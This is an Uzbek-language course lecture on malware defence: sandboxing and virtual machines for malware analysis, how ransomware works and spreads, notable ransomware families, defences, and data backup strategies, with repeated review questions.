Shuningdek, barcha muhim tizimlar uchun ko‘p faktorli autentifikatsiya (MFA) majburiy bo‘lishi kerak. 2025-yilgi Unit 42 Global Incident Response Report ma’lumotiga ko‘ra, MFA yo‘qligi haqiqiy akkaunt ma’lumotlari yordamida dastlabki kirish sodir bo‘lgan holatlarning 28% da sabab bo‘lgan.
Ma’lumotlarni zaxiralash va qayta tiklash
Muhim ma’lumotlarni muntazam, alohida (izolyatsiya qilingan) va tekshiruvdan o‘tgan zaxira nusxalarini yaratish ransomware va boshqa malware hujumlariga qarshi eng samarali himoyalardan biridir.
Agar tizim zararlansa saqlangan zaxiralar yordamida tez tiklanish imkoniyati bo‘ladi, ma’lumot yo‘qotilishi minimal darajaga tushadi. Bu biznesning uzluksiz ishlashini ta’minlaydi.
	Antivirus va anti-malware dasturlarining asosiy vazifalari nimalardan iborat va ular real vaqt rejimida qanday himoya mexanizmlarini taqdim etadi?
	•	Patch management (yangilanishlarni boshqarish) jarayoni malware hujumlarini kamaytirishda qanday rol o‘ynaydi va nega doimiy yangilanishlar muhim?
	•	Firewallar (tarmoq va host darajasidagi) malware kirib kelishining oldini olishda qanday prinsip asosida ishlaydi?
	•	Elektron pochta xavfsizlik tizimlari phishing va zararli ilovalarni aniqlashda qanday texnikalardan foydalanadi?
	•	Web-filtrlash usullari qaysi holatlarda foydalanuvchilarni zararli saytlar va ko‘chirib olishga asoslangan hujumlardan himoya qiladi?
	•	AI va mashina o‘rganish asosidagi xavfsizlik yechimlari malwareni aniqlashda an’anaviy usullardan qanday ustunliklarga ega?
	•	Sandboxing texnikasi malware xatti-harakatlarini tahlil qilishda qanday afzalliklarga ega va u qanday xavflarni bartaraf etadi?
Nazorat savollari
	•	Antivirus va anti-malware dasturlarining asosiy vazifalari nimalardan iborat va ular real vaqt rejimida qanday himoya mexanizmlarini taqdim etadi?
	•	Patch management (yangilanishlarni boshqarish) jarayoni malware hujumlarini kamaytirishda qanday rol o‘ynaydi va nega doimiy yangilanishlar muhim?
	•	Firewallar (tarmoq va host darajasidagi) malware kirib kelishining oldini olishda qanday prinsip asosida ishlaydi?
	•	Elektron pochta xavfsizlik tizimlari phishing va zararli ilovalarni aniqlashda qanday texnikalardan foydalanadi?
	•	Web-filtrlash usullari qaysi holatlarda foydalanuvchilarni zararli saytlar va ko‘chirib olishga asoslangan hujumlardan himoya qiladi?
	•	AI va mashina o‘rganish asosidagi xavfsizlik yechimlari malwareni aniqlashda an’anaviy usullardan qanday ustunliklarga ega?
	•	Sandboxing texnikasi malware xatti-harakatlarini tahlil qilishda qanday afzalliklarga ega va u qanday xavflarni bartaraf etadi?
Nazorat savollari
8.3. Sandboxing va ajratish  (Ma’ruza mashg‘uloti)

1. Virtual mashina texnologiyasi. 
2. Virtual mashina vositalari. 
3. Sandboxing vositalari.
Reja:
1. Virtual mashina texnologiyasi. 
2. Virtual mashina vositalari. 
3. Sandboxing vositalari.
Reja:

Virtual mashina, ajratish, izolyatsiyalash, sandbox, qumli quti, host OT, mehmon OT, Parallels, Microsoft Virtual PC, Microsoft Hyper-V, Virtual Box, Xen virtual, VMware.
Kalit so‘zlar:
Virtual mashina, ajratish, izolyatsiyalash, sandbox, qumli quti, host OT, mehmon OT, Parallels, Microsoft Virtual PC, Microsoft Hyper-V, Virtual Box, Xen virtual, VMware.
Kalit so‘zlar:
Virtual mashina texnologiyasi
Dinamik tahlilni amalga oshirishda zararli dasturlarni ishga tushirishdan oldin xavfsiz muhitni о‘rnatish talab etiladi. Tahlillanuvchi zararli dastur turli buzg‘unchi harakatlarni amalga oshirishi mumkinligi bois, ishchi operatsion tizimda ishga tushurilgan taqdirda unga zarar yetkazishi va tarmoq bо‘ylab tarqalishi mumkin. Xavfsiz muhit ishchi kompyuter va tarmoqdagi boshqa kompyuterlarga kutilmagan va keraksiz xavfga duchor qilmasdan zararli dasturni tekshirish imkonini beradi.
Zararli dasturlarni xavfsiz о‘rganish uchun alohida ajratilgan fizik yoki virtual mashinadan foydalanish mumkin. Alohida ajratilgan mashina yoki tarmoq (air-gapped network) zararli dasturlarni tahlillashda qator afzalliklarni taqdim etsada, Internetga ulanishning mavjud emasligi, zararli dasturlarni yuklab olish yoki boshqa mashinaga kо‘chirishning murakkabligi bois amalda virtual mashina muhitidan keng qо‘llaniladi. Virtual mashina bilan bog‘liq muammolar sifatida esa ba’zi zararli dasturlarni о‘zi yuklanuvchi muhitni tekshirish imkoniyatiga egaligi va virtual muhitda yuklanmasligini keltirish mumkin.
Virtual mashina strukturasi. Virtual mashina kompyuter ichidagi kompyuterga о‘xshash bо‘lib, uning strukturasi 8.1-rasmda aks ettirilgan. Mehmon OT host OTdagi virtual mashinada о‘rnatilib va uning virtual mashinada ishga tushishi host OTdan ajratiladi. Virtual mashinada ishga tushirilgan zararli dastur host OTga zarar etkaza olmaydi. Bundan tashqari, virtual mashina zararlangan taqdirda mehmon OTni osonlik bilan о‘chirib tashlash yoki virtual mashinani xavfsiz holatiga qaytarish mumkin bо‘ladi.

8.1-rasm. Virtual mashina strukturasi
Virtual mashina vositalari
VMware tomonidan qator desktop shaklidagi virtuallashtirish vositalari taqdim etib, ular zararli dasturlarni tahlil qilishda qator imkoniyatlarni taqdim etadi. Bundan tashqari, Parallels, Microsoft Virtual PC, Microsoft Hyper-V, Virtual Box va Xen virtual mashina ilovalaridan foydalanish mumkin. Ushbu paragrafda VMware misolida virtual mashinani yaratish va sozlash masalasi kо‘rib chiqiladi. Agar sizda o‘rnatilayotgan mehmon OT Linux oilasiga oid bo‘lsa, u holda Virtual Box yaxshi tanlov.
Zararli dasturni tahlillash mashinasini yaratish. Virtual mashina uchun asosiy xotirdan joy ehtiyojga qarab ajratilib, zaruriyat bо‘lganida VMware vositasida uni osonlik bilan kengaytirish mumkin. Dastlabki holda zararli dasturlarni tahlili amalga oshirish uchun virtual mashina uchun 20 Gb xotira ajratish yetarli bо‘ladi.
Shundan sо‘ng, virtual mashinaga mehmon OTni о‘rnatish talab etiladi. Mazkur holda aksariyat zararli dasturlar Windows OT uchun mо‘ljallangani va aksariyat tahlillanuvchi zararli dasturlar Windows XP OT uchun mosligini hisobga olib,  Windows XP OTni о‘rnatish tavsiya etiladi.
Virtual mashinada OT о‘rnatilganidan sо‘ng, unga qо‘shimcha talab etiluvchi ilovalarni о‘rnatish kerak bо‘ladi. Ushbu ilovalarga quyidagilarni misol keltirish mumkin:
	•	ApateDNS - http://www.mandiant.com/; 
	•	Autoruns - http://www.sysinternals.com/;
	•	BinDiff - http://www.zynamics.com/;
	•	BinNavi - http://www.zynamics.com/;
	•	Bochs - http://bochs.sourceforge.net/;
	•	Burp Suite -  http://portswigger.net/burp/;
	•	Capture BAT - http://www.honeynet.org/;
	•	CFF Explorer - http://www.ntcore.com/;
	•	Deep Freeze - http://www.faronics.com/;
	•	Dependency Walker - http://www.dependencywalker.com/;
	•	Hex Editors;
	•	Hex-Rays Decompiler - http://www.hex-rays.com/;
	•	IDA Pro - http://www.hex-rays.com; 
	•	Immunity Debugger - http://www.immunityinc.com/; 
	•	Import REConstructor - http://tuts4you.com/download.php?view.415.;  
	•	InetSim - http://www.inetsim.org/; 
	•	LordPE; - http://www.woodmann.com/collaborative/tools/index.php/LordPE; 
	•	Zero Wine - http://zerowine.sourceforge.net/; 
	•	YARA - http://code.google.com/p/yara-project/;
Shundan sо‘ng, VMware Tools vositasi о‘rnatilishi shart. Buning uchun, VMware menyusidan VM Install VMware Tools bandi tanlanadi. Ushbu vosita klaviatura va sichqoncha bilan ishlashda foydalanuvchiga qulaylik yaratadi. Bundan tashqari, host OT bilan umumiy katalog yaratishda va boshqa qator imkoniyatlarni taqdim etadi.
Shundan sо‘ng, VMware uchun ba’zi sozlanmalarni amalga oshirish talab etiladi.
VMwareni sozlash. Aksariyat zararli dasturlar о‘z harakatlarini tarmoq orqali amalga oshirgani bois, ularni tahlillashda virtual mashinada tarmoq imkoniyatini mavjudligi talab etiladi. VMware vositasida virtual mashina uchun tarmoqni tashkil etishning bir qancha usullari mavjud (8.2-rasm).
Biroq, tarmoqdan har doim ham foydalanish talab etilmaydi. Shu bois, mazkur holatda tarmoqni uzib turish talab etiladi. VMware vositasida buning imkoniyati mavjud bо‘lib, buni VMRemovable Devices (Съёмные устройства) bandi orqali yoki Connect at power on (Подключение при включении) bandini tanlash orqali amalga oshirish mumkin.

8.2-rasm. Virtual tarmoq sozlanmasi
Virtual mashina holatini zaxiralash va tiklash (snapshots). Snapshot – bu virtual mashinaning о‘ziga xos xususiyatlaridan biri bо‘lib, OTlardagi qayta tiklash nuqtasiga (restore point) о‘xshaydi. 8.3-rasmda keltirilgan vaqt oralig‘i snapshotni qanday ishlashini kо‘rsatadi. Dastlab 8.00 da kompyuter holati saqlanadi. Shundan sо‘ng zararli dasturni tahlillash amalga oshiriladi. Jarayon tugagandan sо‘ng, soat 10.00 da kompyuter holati orqaga (8.00 dagi) qaytariladi. Mazkur holda 8.00 dan 10.00 gacha paydo bо‘lgan о‘zgarishlar va komponentlar о‘chiriladi.

8.3-rasm. Snapshot vaqt oralig‘i
Bundan tashqari, virtual mashinadan ma’lumotlarni host OTga yoki teskari holatlar zararli dasturlarni tahlillash davomida uchrab turadi. Bunday holda VMware orqali taqsimlangan katalogni (Shared folder) о‘rnatish talab etiladi.
Sandboxing vositalari
Ushbu dasturiy vositalar sodda dinamik tahlillashda keng foydalanilib, u host OT bilan himoyalangan muhitni hosil qiladi va ZD ushbu muhitda yuklaydi.
Bu turdagi vositalarga Norman SandBox, GFI Sandbox, Anubis, Joe Sandbox, ThreatExpert, BitBlaze va Comodo Instant Malware Analysis (open source) larni olish mumkin. Amalda Norman SandBox va GFI Sandboxlardan keng foydalaniladi.
Izoh. Amalda keng foydalanilayotgan sandboxes dasturlar pullik hisoblanadi.
Umumiy holda barcha sandboxes dasturiy vositalari bir xil ishlash algoritmiga ega. Ya’ni, ZD himoyalangan sohada yuklanadi va OT belgilangan sohalaridagi о‘zgarishlarga asosan tahlil natijalari shakllantiriladi.
Quyidagi 8.4-rasmda  GFI Sandboxda olingan PDF turidagi tahlil natijasi keltirilgan.

8.4-rasm. GFI Sandboxning win32XYZ.exe ZD uchun sodda tahlil natijasi
Rasmga kо‘rsatilganidek, GFI Sandboxning tahlilari oltita bо‘limga kо‘ra olingan:
	•	Analysis Summary bо‘limi. Bu bо‘lida ZD statik tahlil natijasi va dinamik tahlil natijalarining yuqori darajali ma’lumotlari keltiriladi;
	•	File Activity bо‘limi. Bu bо‘limda ZD tomonidan amalga oshirilgan har bir jarayon uchun о‘chirilgan, ochilgan, yaratilgan va foydalanilgan barcha fayllar rо‘yxati beriladi;
	•	Created Mutexes bо‘limi. Bu bо‘limda ZD tomonidan yaratilgan mutekslar rо‘yxati keltiriladi;
	•	Registry Activity bо‘limi. Bu bо‘limda registorda mavjud bо‘lgan о‘zgarishlar keltiriladi;
	•	Network Activity bо‘limi. Bu bо‘limda ZD tomonidan yaratilgan tarmoq faolligini, jumladan, tinglash portini о‘rnatish yoki DNS sо‘rovini bajarishni о‘z ichiga oladi;
	•	VirusTotal Results bо‘limi. Bu bо‘limda ZDni VirusTotal orqali skanerlash natijasi keltiriladi.
Sandbox kamchiliklari. Kо‘plab Sandbox dasturiy vositalari bir nechta katta kamchiliklarga ega. Masalan, Sandboxlarda ZD faqat yuklash orqali tahlillanadi (buyruqlar satrida buni amalga oshirish imkoniyati mavjud emas). Agar ZD buyruqlar satridan yuklanishni sо‘rasa bu holda Sandbox dasturlar bu ZD yuklay olmaydi.
Shuningdek, sandbox dasturlari uzoq kutish holatida bо‘lganida barcha hodisalarni qayd etmaydi. Masalan, zararli dastur yuklanishdan oldin bir kun kutish holatida bо‘lsa, harakatni kuzatishga imkoniyat bо‘lmaydi. 
Bundan tashqari, quyidagi kamchiliklar kuzatiladi:
	•	ZD tez-tez vertual mashina yuklanganini aniqlaydi va bu holda ZD yuklanishdan о‘zini tо‘xtatishi yoki о‘zini boshqacha tutishi mumkin. Bu barcha Sandboxlar uchun mos emas.
	•	Ba’zi ZD yuklanishda OT maxsus fayl va registor ma’lumotlarini talab etadi. Bu ma’lumotlar о‘z navbatida Sandboxda mavjud bо‘lmasligi mumkin.
	•	Agar ZDlar dll fayl kengaytmasida bо‘lsa, ular yuklanuvchi ZDlar (.exe kengaytmali) dek tо‘liq Sandboxga yuklanmaydi.
	•	Sandbox muhiti ZD uchun mos bо‘lmasligi mumkin. Masalan, Windows XP ga mos bо‘lgan ZD, Windows 7 uchun mos bо‘lmasligi mumkin.
	•	Sandboxlar ZD larni vazifasini aniqlasada, aslida nima qilayotganini aytmaydi.
	Ajratilgan muhit nima uchun kerak, u nima imkonni beradi?
	•	Virtual mashina haqida ma’lumot bering, uning maqsadi nimadan iborat?
	•	Qanday virtual mashinalarni bilasiz?
	•	Virtual mashinalar qanday kamchiliklarga ega?
	•	Sandboxlar nima va ularning vazifasi nimadan iborat?
	•	Sandboxlar qanday kamchliklarga ega?
Nazorat savollari
	•	Ajratilgan muhit nima uchun kerak, u nima imkonni beradi?
	•	Virtual mashina haqida ma’lumot bering, uning maqsadi nimadan iborat?
	•	Qanday virtual mashinalarni bilasiz?
	•	Virtual mashinalar qanday kamchiliklarga ega?
	•	Sandboxlar nima va ularning vazifasi nimadan iborat?
	•	Sandboxlar qanday kamchliklarga ega?
Nazorat savollari
8.4. Ransomware zararli dasturi  (Ma’ruza mashg‘uloti)
1. Ransomware dasturi, uning maqsadi, turlari, tarqalish usullari. 
2. Ransomware zararli dasturidan himoyalanish usullari. 
3. Ma’lumotlarni zaxira nusxalash, qayta tiklash usullari.
Reja:
1. Ransomware dasturi, uning maqsadi, turlari, tarqalish usullari. 
2. Ransomware zararli dasturidan himoyalanish usullari. 
3. Ma’lumotlarni zaxira nusxalash, qayta tiklash usullari.
Reja:

Ransomware, File Encryption (Fayl shifrlash), Data Backup (Ma’lumotlarni zaxiralash), 3-2-1 Backup Rule, Data Recovery (Ma’lumotlarni tiklash).
Kalit so‘zlar:
Ransomware, File Encryption (Fayl shifrlash), Data Backup (Ma’lumotlarni zaxiralash), 3-2-1 Backup Rule, Data Recovery (Ma’lumotlarni tiklash).
Kalit so‘zlar:
Ransomware dasturi, uning maqsadi, turlari, tarqalish usullari
Ransomware nima?
Ransomware - bu zararli dastur (malware) turi. Kiberjinoyatchilar undan ma’lumotlarni o‘g‘irlab, ularni “garovda ushlab turish” vositasi sifatida foydalanadi. Ular ma’lumotlarni faqat to‘lov (ransoms) amalga oshirilgandan keyin qaytaradi. Ransomware hujumlariga eng ko‘p uchraydigan tashkilotlar shaxsiy ma’lumotlar, moliyaviy ma’lumotlar va intellektual mulk kabi sezgir ma’lumotlarga ega tashkilotlardir.
Ransomware 1980-yillarga borib taqaladi, ammo 2000-yillar boshigacha keng ommaga unchalik tanilmagan edi. Bugungi kunda ransomware hujumlari eng ko‘p uchraydigan uchinchi kiberhujum turi bo‘lib, barcha ma’lumot buzilishlarining 10 foizdan ortig‘iga sabab bo‘ladi. Kriptovalyutalarning paydo bo‘lishi uni yanada foydalanish qamrovini oshirib, bu ransom to‘lovini amalga oshirish osonlashgani bilan xarakterlanadi.
Texnologiya ransomware rivojlanishida katta rol o‘ynaydi, kiberjinoyatchilar ma’lumotlargdan tezda foydalanish va ularni shifrlash metodlarini doim takomillashtirib borishadi. Kompaniyalar COVID cheklovlari va ehtiyot choralaridan so‘ng yanada ko‘proq raqamlashtirilmoqda. Natijada, hozirgacha bo‘lgan davrlarga qaraganda masofadan turib boshqariladigan ma’lumotlar hajmi oshgan.
Ransomware evolyutsiyasi
Ransomware texnologiyasi birinchi bo‘lib Garvardda ilmiy tayyorgarlikdan o‘tgan evolyutsion biolog Jozef L. Popp tomonidan ishlab chiqilgan. U Jahon sog‘liqni saqlash tashkiloti tomonidan Shvetsiyaning Stokgolm shahrida o‘tkazilgan xalqaro OITS konferensiyasi ishtirokchilariga ransomware yuqtirilgan disketalarni tarqatib, AIDS Trojan nomli dasturini ishga tushirdi. Kod kompyuterlardagi fayl kataloglarini yashirib qo‘ydi va ularni tiklash uchun Panamaga 189 dollar yuborishni talab qildi.
Bugungi kunda ransomware ancha rivojlangan bo‘lsada, uning asosiy maqsadi o‘sha foydalanuvchilardan pul undirib olish sifatida qolmoqda. U diskettadan internetga, elektron pochta orqali, audio va video yuklab olishlar orqali, hatto tasvir fayllari ichida tarqaladigan shaklga o‘tgan. So‘nggi yillarda u kriptovalyuta qazib oluvchilar (cryptominers) uchun ham vositaga aylangan. Raqamli aktivlarni “mayning” qilish katta elektr xarajatlarini talab qilgani sababli, ransomware ko‘pincha qurbon kompyuterining resurslaridan foydalanib, uzoq masofadagi kriptomayner foydasiga ishlaydigan qilib ishlab chiqiladi.
Ransomware qanday ishlaydi?
Ransomware har qanday shaklda bo‘lishidan qatiy nazar, kompyuterga kirgach, yashirin ravishda uni yuqtiradi. Dastur fayllarga hujum qiladi, ularni o‘zgartiradi va tizimdan foydalanish huquqlarini buzadi. Natijada, kompyuter infratuzilmasi uni boshqarayotgan kiberjinoyatchi tomonidan garovda ushlab turiladi.
Fayllarni shifrlash. Cryptoware deb ataladigan ransomware qurbonning ish yoki shaxsiy kompyuteridagi fayllarni shifrlaydi. Shundan so‘ng egasi bu fayllarni izlay olmaydi, ocholmaydi, faqat to‘lov amalga oshirilgandan keyingina hujumchi deshifrlashi mumkin. Huquq faqat shifrlash kaliti bo‘lgan hujumchida bo‘ladi. Ba’zan hujumchi butun kompyuterdan foydalanishni bloklab, yangi parolni berish uchun ham pul talab qiladi.
Leakware yoki doxware turida hujumchi qurbonning qattiq diskidagi maxfiy ma’lumotlarni oshkor qilish bilan tahdid qiladi. Patentlar yoki muhim loyihalar kabi muhim sanoat sirlariga ega kompaniyalar bu turdagi hujumlar uchun “ideal nishon” bo‘ladi.
To‘lov va talablar. Hakerlar odatda Western Union kabi usullar yoki matnli xabarlar orqali pul o‘tkazishni talab qiladi va bu ularga shaxsini yashirishga yordam beradi. Pul olingandan so‘ng ular fayllarni deshifrlaydi va tizimni tiklaydi. Ba’zilar bitcoin orqali to‘lov talab qilib, bu ularga anonim va vositachisiz tranzaksiyani amalga oshirishga imkon beradi.
Ba’zi hujumchilar esa o‘zini qonun ijro organi yoki davlat rasmiysi sifatida ko‘rsatishi mumkin. Ular go‘yoki qurbon kompyuterida pornografiya yoki litsenziyaga ega bo‘lmagan dastur topilganini aytib, kompyuterni “bloklashganini”, uni ochish uchun “jarima” to‘lash kerakligini bildiradi.
Ransomware ishlash bosqichlari
Qurilma zararli kodga duch kelgandan so‘ng, ransomware hujumi quyidagi bosqichlar bo‘yicha amalga oshadi. Ransomware ba’zan qurilmada uzoq vaqt davomida yashirin holda qolishi, faqat eng qulay (zaif) paytni kutib turishi va shundan keyingina hujumni ishga tushirishi mumkin (8.5-rasm).
1. Infeksiya (Infection): Ransomware yashirin tarzda qurilmaga yuklab olinadi va o‘rnatiladi.
2. Ishga tushish (Execution): Ransomware tizimni skanerlaydi, lokal fayllarni, tarmoqqa ulangan yoki ulanmagan barcha tizimlarni xaritalaydi va nishon fayl turlarini aniqlaydi. Ba’zi ransomware turlari hatto barcha zaxira (backup) fayllarini o‘chirib yuboradi yoki ularni shifrlaydi.
3. Shifrlash (Encryption): Ransomware Command and Control (C2) serveri bilan kalit almashinuvi qiladi va olingan shifrlash kaliti yordamida oldingi bosqichda topilgan barcha fayllarni shifrlaydi. Bu orqali ma’lumotlardan foydalanish butunlay bloklanadi.
4. Foydalanuvchini xabardor qilish (User Notification): Ransomware tizimga maxsus ko‘rsatmalar (readme yoki instruction files) qo‘shadi va ular orqali foydalanuvchiga shifrni ochish uchun to‘lov qilish tartibi haqida talabnoma (ransom note) ko‘rsatadi.
5. Tozalash (Cleanup): Ransomware odatda o‘zini o‘chiradi va faqat to‘lov bo‘yicha ko‘rsatmalarni qoldiradi. Bu uni aniqlashni yanada qiyinlashtiradi.
6. To‘lov (Payment): Qurbon ko‘rsatmada berilgan havolaga bosadi, u esa to‘lovni qanday amalga oshirish bo‘yicha qo‘shimcha ma’lumot beruvchi web-sahifaga olib boradi. TOR xizmatlari ko‘pincha trafikni yashirish va aniqlanmaslik uchun ishlatiladi.
7. Shifrni ochish (Decryption): Qurbon hujumchining Bitcoin manziliga to‘lovni amalga oshirgandan so‘ng, unga ma’lumotlarni tiklash uchun kerakli shifrni ochish kaliti yuborilishi mumkin. Biroq, bu kalitni olinishiga hech qanday kafolat yo‘q, ba’zi hujumchilar pulni olib, kalitni bermaydi.

8.5-rasm. Ransomwareni ishlash ketma-ketligi
Ransomware tarqatish usullari
Qurilma qurbon zararli havolani bosganda, zararli web-sahifaga tashrif buyurganda yoki ichida yashirin ransomware kodi bo‘lgan fayl, ilova yoki dastur o‘rnatganda yuqtiriladi. Bu turli yo‘llar bilan sodir bo‘lishi mumkin:
Fishing xabarlari: Elektron pochta ichidagi havolani bosish natijasida qurbon zararli web-sahifaga yo‘naltiriladi.
Email ilovalari (Email attachments): Elektron pochta ilovasini ochish va zararli makrolarni yoqish; Masofaviy boshqaruvli troyan (RAT) joylashtirilgan hujjatni yuklab olish; Zararli JavaScript yoki Windows Script Host (WSH) faylini o‘z ichiga olgan ZIP-faylni yuklab olish.
Ijtimoiy tarmoqlar:  Facebook, Twitter, boshqa postlar, messenjer chatlaridagi zararli havolalarni bosish.
Zararli reklama (Malvertising): Zararli kod joylashtirilgan asl (legitim) reklama saytiga bosish.
Zararlangan dasturlar (Infected programs):  Ichida zararli kod bo‘lgan dastur yoki ilovani o‘rnatish.
Avto-yuqtirishlar (Drive-by infections): Xavfsiz bo‘lmagan, shubhali yoki soxta web-sahifaga tashrif buyurish; Pop-up oynasini ochish yoki yopish. 
Trafik taqsimlash tizimi (Traffic Distribution System): Foydalanuvchi geografik joylashuvi, brauzer turi, operatsion tizimi yoki boshqa filtrlarga asoslanib, qonuniy sahifadagi havola orqali zararli saytga yo‘naltiriladi.
O‘z-o‘zidan tarqalish (Self-propagation): Zararli kodning tarmoq orqali yoki USB qurilmalar orqali boshqa qurilmalarga tarqalishi.
Quyida katta zarar yetkazgan ransomewarelarga misollar keltirilgan:
WannaCry:  Windows SMB protokolidagi zaiflikdan foydalanadigan va o‘z-o‘zini tarqatadigan shifrlovchi ransomware. 2017-yilda u 150 mamlakatda 230 mingdan ortiq kompyuterga tarqalib, taxminan 4 milliard dollarlik zarar yetkazgan. Uni aniqlash va olib tashlash nisbatan oson.
Cerber: Ransomware-as-a-service (RaaS) modeli bo‘yicha tarqatiladi va jinoyatchilar uni ijaraga olib hujum qiladi. Fayllarni sezdirmasdan shifrlaydi va antivirus hamda Windows xavfsizlik funksiyalarini bloklashga urinadi. Shifrlash tugagach, ish stoliga ransom xabari chiqaradi.
Locky: Locky 160 turdagi fayllarni shifrlay oladi va asosan dizaynerlar, muhandislar ishlatadigan fayllarni nishonga oladi. U 2016-yilda tarqalgan bo‘lib, phishing xatlari yoki zararli makrolarga ega Word/Excel fayllari orqali yuqtiriladi. Ba’zan ZIP-fayl ochilganda avtomatik o‘rnatiladi.
Cryptolocker: Cryptolocker 2017-yilda tarqalib, 500 mingdan ortiq kompyuterni zararlagan. U email, fayl almashish saytlari va himoyasiz yuklab olishlar orqali tarqaladi, shuningdek, tarmoq disklaridagi fayllarni ham shifrlay oladi. Yangi variantlari an’anaviy antiviruslardan oson qochib ketadi.
Petya / NotPetya: Petya MFT (Master File Table) ni shifrlab, butun diskni foydalanib bo‘lmaydigan holga keltiradi; 2016-yilda soxta ish arizalari orqali tarqalgan. U admin ruxsatini so‘raydi, tizimni qayta yuklaydi va orqa fonda diskni shifrlaydi. NotPetya esa yanada xavfli bo‘lib, o‘zini tarmoq bo‘ylab avtomatik tarqata oladi va shifrlangan ma’lumotlar qayta tiklanmaydi.
Ryuk: Ryuk phishing xatlari yoki zararli yuklab olishlar orqali tarqaladi va trojan o‘rnatib, doimiy tarmoq ulanishini yaratadi. Hujumchilar uni APT hujumlari uchun ishlatib, keylogger, huquq oshirish va tarmoq bo‘ylab tarqalish kabi qo‘shimcha vositalar o‘rnatadi. Eng oxirida fayllar shifrlanib, ransom talabi qo‘yiladi.
GrandCrab (GandCrab): GrandCrab 2018-yilda paydo bo‘lgan bo‘lib, Windows tizimlarini nishonga olib fayllarni shifrlaydi va ransom talab qiladi. Ba’zi hujumlar qurbonlarni uyatli ma’lumotlarni oshkor qilish bilan qo‘rqitgan. Hozirda GrandCrabning ko‘plab versiyalari uchun bepul decryptorlar mavjud.
Ransomware zararli dasturidan himoyalanish usullari
Ransomware zararli dasturidan himoyalanishda quyidagilarga amal qilish tavsiya etiladi:
Endpoint himoyasi: Antivirus ransomwarega qarshi himoyaning birinchi qadamidir, biroq eski antivirus vositalari faqat ayrim ransomware turlaridan himoya qila oladi.
Zamonaviy endpoint himoya platformalari NGAV (keyingi avlod antivirus) imkoniyatlarini taqdim etadi, u yashirin va paket ichidagi ransomware, WannaCry kabi faylsiz hujumlar va signaturasi ma’lumotlar bazasida hali mavjud bo‘lmagan zero-day zararli dasturlardan himoya qiladi. Bundan tashqari, ular qurilma firewalllari va EDR (Endpoint Detection and Response) funksiyalarini taklif etadi, bu esa xavfsizlik jamoalariga endpointlarda sodir bo‘layotgan hujumlarni real vaqt rejimida aniqlash va bloklash imkonini beradi.
Ma’lumotlarni zaxiralash: Ma’lumotlarni tashqi diskka muntazam zaxiralash, versiyalar nazorati va 3-2-1 qoidasiga rioya qilish (uchta nusxa, ikkita turli muhitda, bittasi boshqa joyda saqlansin). Iloji bo‘lsa, zaxira diskni qurilmadan uzib qo‘yish, shunda ransomware uni ham shifrlay olmaydi.
Yangilanishlar (patch) boshqaruvi: Qurilmaning operatsion tizimi va o‘rnatilgan dasturlarini yangilab turing, xavfsizlik yangilanishlarini o‘rnating. Ma’lum zaifliklarni aniqlash va ularni tezda bartaraf etish uchun zaifliklarni skanerlashni amalga oshiring.
Ilovalar oq ro‘yxati va nazorati: Qurilmada faqat markazdan boshqariladigan “oq ro‘yxat”dagi ilovalarni o‘rnatishga ruxsat beruvchi nazorat mexanizmlarini joriy qiling. Brauzer xavfsizlik sozlamalarini kuchaytiring, Adobe Flash va zaif plaginlarni o‘chirib qo‘ying, zararli saytlarni bloklash uchun web-filtrlashdan foydalaning. Word kabi ilovalarda makroslarni o‘chirib qo‘ying.
Email himoyasi: Xodimlarga ijtimoiy manipulyatsiya (social engineering) asosidagi xatlarni tanish bo‘yicha treninglar o‘tkazish, ularni phishingni aniqlash bo‘yicha sinovdan o‘tkazish talab etiladi. Shubhali emaillarni avtomatik bloklash uchun spam filtrlari va endpoint himoya texnologiyalaridan foydalanish; foydalanuvchi zararli havolani bossa ham, uni bloklab qo‘yish kabilar foydalidir.
Tarmoq himoyasi: Firewall yoki WAF, IPS/IDS kabi tizimlardan foydalanish orqali ransomware Command & Control serverlari bilan aloqa qila olmasligini ta’minlash mumkin.
Ma’lumotlarni zaxira nusxalash, qayta tiklash usullari
Ma’lumotlarni zaxira nusxalash
Hozirgi kunda ma’lumotlarning yo‘qolishi tashkilotlar uchun asosiy xavfsizlik muammolaridan biri bo‘lib, buning natijasida tashkilot katta zarar ko‘rishi mumkin. Shuning uchun, tashkilotdan muhim ma’lumotlarni muntazam zaxira nusxalab borish talab etiladi.
Ma’lumotlarni zaxira nusxalash – muhim ma’lumotlarni nusxalash yoki saqlash jarayoni bo‘lib, ma’lumot yo‘qolgan vaqtda qayta tiklash imkoniyatini beradi. Ma’lumotlarni zaxira nusxalashdan asosiy maqsad quyidagilar:
	•	zarar yetkazilganidan so‘ng tizimni normal ish holatiga qaytarish;
	•	tizimda saqlanuvchi muhim ma’lumotlarni yo‘qolganidan so‘ng uni qayta tiklash.
Tashkilotlarda ma’lumotlar yo‘qolishi moliyaviy tomondan va mijozlarga aloqador holda ta’sir qilishi bilan xarakterlansa, shaxsiy kompyuterda esa shaxsiy fayllarni, rasmlarni va boshqa qimmatli ma’lumotlarni yo‘qolishiga sababchi bo‘ladi.
Ma’lumotlarni zaxira nusxalashning ideal strategiyasi ma’lumotni to‘g‘ri tanlashdan boshlab, to ma’lumotni kafolatli tiklash jarayonigacha bo‘lgan bosqichlarni o‘z ichiga oladi. Turli tashkilotlarda zaxira nusxalash farq qilsada, ma’lumotlarni zaxira nusxalashdan oldin quyidagi xususiyatlarga e’tibor qaratish muhim hisoblanadi:
	•	ma’lumotlarni zaxira nusxalash strategiyasi ixtiyoriy tashqi qurilmalardan ma’lumotlarni tiklash imkoniyatiga ega bo‘lishi shart. Ushbu qurilmalarga misol sifatida serverlar, host mashinalar, noutbuklar va boshqalarni ko‘rsatish mumkin.
	•	agar tabiiy ofat natijasida ma’lumot yo‘qolsa, zaxira nusxalash strategiyasi faqat chekli sondagi insidentlarga qarshi himoya bilan cheklanmasligi zarur. Tabiiy ofat yuz bergan taqdirda ham strategiya o‘zida ma’lumotlarni tiklash usullarini mujassamlashtirishi shart;
	•	strategiya dastlabki bosqichlarda ma’lumotlarni qayta tiklash uchun muhim qadamlardan iborat bo‘lishi kerak;
	•	zaxira nusxalash narxining qimmat bo‘lmasligi tashkilot uchun moliyaviy madad hisoblanadi;
	•	inson tomonidan bo‘lishi mumkin bo‘lgan xatoliklarni tezlik bilan oldini olish uchun ma’lumotlarni zaxira nusxalash avtomatik tarzda amalga oshirilishi kerak.
Hozirda ma’lumotlarni zaxira nusxalarini saqlashda quyidagi vositalardan foydalanilmoqda:
	•	Optik disklar (DVD, Blu-ray);
	•	Ko‘chma qattiq disklar/ USB xotiralar;
	•	Lentali disklar;
	•	Bulutli saqlash tizimlari (Google Drive, OneDrive, Dropbox, AWS, Azure).
